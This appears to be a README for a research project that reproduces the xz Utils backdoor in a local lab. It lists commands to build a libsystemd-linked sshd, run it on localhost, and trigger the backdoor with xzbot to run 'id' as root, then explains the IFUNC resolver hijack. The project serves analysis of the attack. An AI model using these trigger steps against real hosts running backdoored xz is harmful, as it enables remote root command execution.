This project tries to minimize the number of steps necessary to trigger the
[xz backdoor](https://en.wikipedia.org/wiki/XZ_Utils_backdoor).

The backdoor needs `sshd` compiled with libsystemd support, which requires a
patch most distributions don't ship.

Here's how you can check if `sshd` is linked against libsystemd:

```sh
readelf -d /usr/sbin/sshd | grep NEEDED
```

To help testing a script to build `sshd` with the libsystemd patch is included:

```sh
make sd_sshd
```

Then just `sshd` with the helper script:

```sh
sudo ./run_sshd
```

This is simply a wrapper to run `sshd` in a clean environment and with
debugging options:

```sh
env -i LD_LIBRARY_PATH="$PWD" "$PWD/sd_sshd" -D -d -oListenAddress=127.0.0.1 -p2222
```

Then you can use [xzbot](https://github.com/amlweems/xzbot) to trigger the
backdoor. It will use a custom ed448 key generated with 0 as seed.

```
make xzbot
./xzbot -cmd 'id > /root/xz'
```

# How?

The backdoor is installed before the program starts, when the linker is
executing checks. It's abusing the
[IFUNC](https://sourceware.org/glibc/wiki/GNU_IFUNC) functionality in a
resolver function that is supposed to be calling `__get_cpuid` to check for cpu
features, but instead the build system modified the code to call `_get_cpuid`
which is inside the backdoor binary, and does **much more**.

Since this repository contains a simplified version of liblzma it's clear what
they were trying to do in commit f8c8e5a.

The backdoor works because many people made mistakes:

 1. The complexity of xz trying to build for a bajillion systems with two
    build systems and few development resources enabled a malicious developer
    to inject a couple of lines in a script with tens of thousans of lines of
    code that is generated for tarballs and nobody looks at.
 2. The developers of systemd did not design it with modularity in mind, so the
    singular libsystemd library provides a ton of functionality most people
    won't use and has nothing to do with an init system, like process
    compressed system logs. Therefore everyone that links to libsystemd links
    to liblzma as well.
 3. Maintainers patched `sshd` to link to libsystemd for a minor feature.

The backdoor binary is incredibly complex and it will take a while to properly
understand all what it does.

I created this project to simplify the process of analysis.
